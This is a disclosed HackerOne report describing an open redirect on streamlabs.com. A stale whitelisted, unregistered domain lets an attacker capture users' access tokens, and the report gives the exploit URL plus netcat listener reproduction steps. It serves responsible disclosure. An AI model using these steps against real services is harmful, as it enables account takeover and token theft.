---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1327742'
original_report_id: '1327742'
title: Steal any users `access_token` via open redirect in https://streamlabs.com/global/identity?popup=1&r=
team_handle: logitech
created_at: '2021-09-02T04:53:32.363Z'
disclosed_at: '2021-11-04T15:55:53.069Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 25
asset_identifier: '*.streamlabs.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
---

# Steal any users `access_token` via open redirect in https://streamlabs.com/global/identity?popup=1&r=

## Metadata

- HackerOne Report ID: 1327742
- Weakness: 
- Program: logitech
- Disclosed At: 2021-11-04T15:55:53.069Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Heyy there,
After  reading the disclosed report #1178239, I started to look for bypasses but I found that it's restricted to only streamlabs.com and merch.streamlabs.com , providing any other domain or subdomain of streamlabs.com gives an error instead of the 302 redirect.

From wayback machine (https://web.archive.org/), I found a bunch of domains which were  used in the redirect parameter `r`.
```
https://streamlabs.com/global/identity?r=https://darthvapes.tv
https://streamlabs.com/global/identity?r=https://dragynslair.live/
https://streamlabs.com/global/identity?r=https://franmg.net/merch
https://streamlabs.com/global/identity?r=https://itzyony2.com
https://streamlabs.com/global/identity?r=https://lmgtwitch.com
https://streamlabs.com/global/identity?r=https://maitresharinganv1.com
https://streamlabs.com/global/identity?r=https://themavshow.tv
https://streamlabs.com/global/identity?r=https://veterangamertv.com
https://streamlabs.com/global/identity?r=https://www.koopatroop.com
https://streamlabs.com/global/identity?r=https://www.lokenplays.com
https://streamlabs.com/global/identity?r=https://yagurlbubblezl4d.com
```

Visiting all these urls in my browser I found that only these 3 domains were allowed (the access_token was sent to this domains)
dragynslair.live
darthvapes.tv
nixxiom.tv


If an authenticated user visits this url, his access_token will be sent to the dragynslair.live domain:
https://streamlabs.com/global/identity?r=https://dragynslair.live/

{F1433713}
In this screenshot you can see that the `access_token` is added as a query parameter.

The most interesting thing about this particular domain is that it is available for registration, which you can verify from here:
https://www.name.com/domain/search/dragynslair.live

Anyone can buy this domain name for $3 , which will allow him to takeover any streamlab's user account 
{F1433718}

----------

**Steps to reproduce:**
As I haven't actually purchased this domain name `dragynslair.live` , to prove that I can steal the `access_token`. I will add dragynslair.live to my `/etc/hosts` file which will point to 127.0.0.1 and a web server wil be running on port 80 locally.
This should be enough to validate this finding.

1.Open your `/etc/hosts` file and add this line to it , save it
```bash
127.0.0.1  dragynslair.live
```
2.Now start a web server on port 80 by using this command  `sudo nc -lvk 80`
3.Open this url https://streamlabs.com/global/identity?popup=1&r=http://dragynslair.live (make sure the user is authenticated)
4.Check the ncat command output you should see the `access_token` parameter 

{F1433725}


This access_token then can be used in the following api endpoints: https://dev.streamlabs.com/reference

------------

## Impact

By just sending the url an attacker can steal victim's `access_token` which can be used in the streamlabs api endpoints.


Thankyou
Regards
Sudhanshu

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
